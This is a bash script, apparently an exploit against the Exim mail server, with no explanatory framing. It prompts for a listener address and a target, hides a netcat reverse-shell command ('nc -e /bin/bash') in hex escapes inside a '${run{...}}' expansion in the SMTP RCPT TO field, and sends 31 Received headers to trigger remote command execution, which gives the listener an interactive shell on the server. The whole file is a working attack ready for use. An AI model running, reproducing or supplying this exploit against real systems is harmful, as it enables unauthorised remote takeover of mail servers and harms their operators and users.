#!/bin/bash

read -p "Listener IP: " ipaddr
read -p "Listener Port: " port
read -p "Exim IP: " svip
read -p "Exim Port: " svport

# Internal Field Separator
IFS='.' read -r ip1 ip2 ip3 ip4 <<< "$ipaddr"

payload="\${run{\x2fbin\x2fnc\x20-e\x20\x2fbin\x2fbash\x20$ip1\x2E$ip2\x2E$ip3\x2E$ip4\x20$port}}"

{
sleep 1
echo "HELO USR"
sleep 1
echo "MAIL FROM:<>"
sleep 1
echo "RCPT TO:<${payload}@localhost>"
sleep 1
echo "DATA"
sleep 1
for i in {1..31}; do
        echo "Received: $i"
done
sleep 1
echo "."
sleep 1
echo "QUIT"
} | nc -C -v $svip $svport | while read -r response; do
echo "Server Response: $response"
done
